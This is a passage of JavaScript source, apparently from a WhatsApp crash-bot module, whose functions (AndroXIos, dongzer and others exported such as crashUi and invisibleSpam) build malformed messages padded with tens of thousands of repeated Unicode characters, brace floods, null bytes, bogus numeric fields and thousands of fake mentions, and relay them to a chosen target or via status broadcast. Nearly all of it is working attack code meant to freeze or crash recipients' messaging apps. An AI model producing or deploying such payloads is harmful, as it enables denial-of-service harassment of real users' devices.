                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function AndroXIos(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "᬴",
                            productMessage: {
                                product: {
                                    productImage: {
                                      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQPsAj-IxLPUhYzu1R8Nw6yDp6ppYKK5fJ09XJF2XpXSU1Bew2GHgnvaIJ0O9iZmuHGs1RUQCo914X8dVgk3gC308eXj841YUQJ3EZZgUg?ccb=9-4&oh=01_Q5Aa3gHiHHKq21as6MtdzN0UP3GTO4IutG48rchGVSrr2ZM2VQ&oe=69A7A69C&_nc_sid=e6ed6c&mms3=true",
                                      directPath: "/o1/v/t24/f2/m232/AQPsAj-IxLPUhYzu1R8Nw6yDp6ppYKK5fJ09XJF2XpXSU1Bew2GHgnvaIJ0O9iZmuHGs1RUQCo914X8dVgk3gC308eXj841YUQJ3EZZgUg?ccb=9-4&oh=01_Q5Aa3gHiHHKq21as6MtdzN0UP3GTO4IutG48rchGVSrr2ZM2VQ&oe=69A7A69C&_nc_sid=e6ed6c",
                                      mimetype: "image/jpeg",
                                      mediaKey: "+Zs9DoeJz+J2mzwQCkgBfhtjAiv33zYhGr2Mz6yNLyw=",
                                      fileEncSha256: "L+ZqvEZJ/YNP7ojtGKPs9bH2H28NEyi73QnB/QLEEsw=",
                                      fileSha256: "PHi+bVRyCbOCe0WeahEF9S/e+DCVkirim2ITX25N9Hk=",
                                      fileLength: { low: 0, high: 1, unsigned: true },
                                      mediaKeyTimestamp: { low: 1738880389, high: 0, unsigned: false }
                                    },
                                    productId: "449756950375071",
                                    title: "᬴",
                                    priceAmount1000: { low: 999, high: 0, unsigned: false },
                                    url: "t.me/primroseell",
                                    productImageCount: 1661992960,
                                    firstImageId: "99999999",
                                    salePriceAmount1000: {
                                        low: -1981284353,
                                        high: -1966660860,
                                        unsigned: false
                                    }
                                },
                                businessOwnerJid: "13135559098@s.whatsapp.net",
                                contextInfo: {
                                    remoteJid: " Raja iblis ",
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                                    ]
                                }
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "᬴"
                        },
                        contextInfo: {
                            remoteJid: " Raja iblis ",
                            mentionedJid: [
                                "13135559098@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                            ],
                            "externalAdReply": {
                              "automatedGreetingMessageShown": true,
                              "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
                              "greetingMessageBody": "\u0000"
                           }
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "᬴".repeat(60000),
                                        sections: []
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }),
        {
            userJid: target
        }
    );
    
  await sock.relayMessage(target, msg.message, {
     participant: {
        jid: target
      },
     messageId: msg.key.id
    }, {});
}

async function dongzer(sock, target) {
  const mentionedJids = Array.from({ length: 2000 }, (_, i) => `628${i + 1}990${i + 1}@s.whatsapp.net`);
  const msg = {
    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
  "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
  "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
  "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
  "mimetype": "image/webp",
  "height": 512,
  "width": 512,
  "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
  "fileLength": "37824",
  "mediaKeyTimestamp": "1771680407",
  "isAnimated": false,
  "stickerSentTs": "1771694793768",
  "isAvatar": true,
  "isAiSticker": true,
  "isLottie": false,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAQIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k=",
    contextInfo: {
      mentionedJid: mentionedJids,
      pairedMediaType: "HD_IMAGE_CHILD",
      statusSourceType: "MUSIC_STANDALONE",
      statusAttributions: [
        {
          type: "STATUS_MENTION",
          music: {
            authorName: "ell",
            songId: "1137812656623908",
            title: "\u0003".repeat(1000),
            author: "\u0003".repeat(1000),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artworkMediaKey: "1771689153",
            artistAttribution: " x ",
            isExplicit: true
          }
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            title: "\u0003".repeat(1000),
            author: "\u0003".repeat(1000),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artistAttribution: "https://t.me/null",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "1771689153"
          }
        },
        embeddedAction: true
      }
    ]
  };

  await sock.relayMessage("status@broadcast", { 
       stickerMessage: msg
  },
  {
    statusJidList: [target]
  });
}

module.exports = { invisibleSpam, docIos, rpnm, DelayCarousel, blankIos, PlainCall, crashUi, AndroXIos, dongzer }
